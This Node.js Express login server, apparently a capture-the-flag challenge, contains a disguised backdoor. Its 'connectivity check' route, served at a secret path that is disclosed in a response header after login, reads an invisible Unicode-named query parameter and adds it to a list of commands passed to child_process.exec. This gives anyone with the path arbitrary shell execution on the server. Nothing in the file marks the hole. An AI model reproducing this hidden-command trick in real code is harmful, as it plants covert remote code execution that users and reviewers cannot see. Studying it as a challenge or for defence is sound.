var mysql = require("mysql");
var express = require("express");
var session = require("express-session");
var bodyParser = require("body-parser");
var path = require("path");
const util = require('util');
const exec = util.promisify(require('child_process').exec);
var fs = require("fs");

var connection = mysql.createConnection({
  host: "localhost",
  user: "login",
  password: "login",
  database: "login",
});

const portasulretro = require("crypto").randomBytes(8).toString("hex"); // If only it was 'd7e9bf5c51a0009f'...

var app = express();
app.use(
  session({
    secret: require("crypto").randomBytes(64).toString("hex"),
    resave: true,
    saveUninitialized: true,
  })
);
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.get("/", function (request, response) {
  response.sendFile(path.join(__dirname + "/login.html"));
});

app.post("/auth", function (request, response) {
  var username = request.body.username;
  var password = request.body.password;
  if (username && password) {
    connection.query(
      "SELECT * FROM accounts WHERE username = ? AND password = ?",
      [username, password],
      function (error, results, fields) {
        if (error) {
          response.send(`error: ${error}`);
        }
        else if (results.length > 0) {
          request.session.loggedin = true;
          request.session.username = username;
          response.redirect("/home");
        } else {
          response.send("Incorrect Username and/or Password!");
        }
        response.end();
      }
    );
  } else {
    response.send("Please enter Username and Password!");
    response.end();
  }
});

app.get("/home", function (request, response) {
  if (request.session.loggedin) {
    var options = { headers: { 'PortaSulRetro': portasulretro } };

    response.sendFile(path.join(__dirname + "/login.js"), options);
  } else {
    response.send("Please login to view this page!");
    response.end();
  }
});

// Check whether we can reach google.com and example.com
app.get(`/${portasulretro}`, async (req, res) => {
  const { timeout,ㅤ} = req.query;
  const checkCommands = [
      'ping -c 1 google.com', 
      'curl -s http://example.com/',ㅤ
  ];

  try {
      const outcomes = await Promise.all(checkCommands.map(cmd => 
              cmd && exec(cmd, { timeout: +timeout || 5_000 })));

      res.status(200).contentType('text/plain');

      var outcomeStdout = '';
      for(i = 0; outcome = outcomes[i]; i ++)  {
        outcomeStdout += `"${checkCommands[i]}": `;
        outcomeStdout += "\n\n";
        outcomeStdout += outcome.stdout.trim();
        outcomeStdout += "\n\n";
      };
      res.send(`outcome ok:\n${outcomeStdout}`);
  } catch(e) {
      res.status(500);
      res.send(`outcome failed: ${e}`);
  }
});

app.listen(3000);
